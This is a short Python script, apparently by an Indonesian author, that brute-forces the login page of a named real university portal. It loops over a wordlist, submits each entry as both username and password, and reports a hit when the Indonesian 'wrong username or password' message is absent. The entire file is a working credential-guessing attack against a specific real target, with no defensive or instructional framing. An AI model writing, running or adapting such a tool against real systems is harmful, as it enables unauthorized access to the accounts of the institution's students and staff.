#coded by Huda
#jgn di ubah ntar eror
import mechanize
import re
import os,time
worldlist = ""
os.system('clear')
print("""
╒══════════════════╕
 \033[1;0m\033[1;41mScan UNSART x byHuda\033[1;0m
╘══════════════════╛
""")
file = input ('Masukan File wordlis: ')
print (' ')
time.sleep(0.2)
print('÷======== sedang melakukan secan =======÷')
time.sleep(0.2)
print(' ')

url ="https://inspire.unsrat.ac.id/login"


try:
    worldlist = open(file, "r")
except:
        print('Masukan yg bener tolol')

for password in worldlist:
    br = mechanize.Browser()
    br.addheaders
    resp = br.open(url)

    br.select_form(nr=0)
    br.form["username"] = password.strip()
    br.form["password"] = password.strip()

    br.methode = "POST"
    response = br.submit()
    #print(resp.code)
    #print(resp.info())
    #print(resp.geturl())

    x = response.read().decode("utf-8")
    gatot = re.search("Username atau Password salah", x)
    if gatot:
    
        print(password.strip() + " | Failed")
        
        #print(response.geturl())
    else:
        print(" Sucess | " + password.strip())
        print(response.geturl())
        break

    #f = open("/sdcard/unsrat.html", "w")
    #f.write(x)
    #f.close()

		
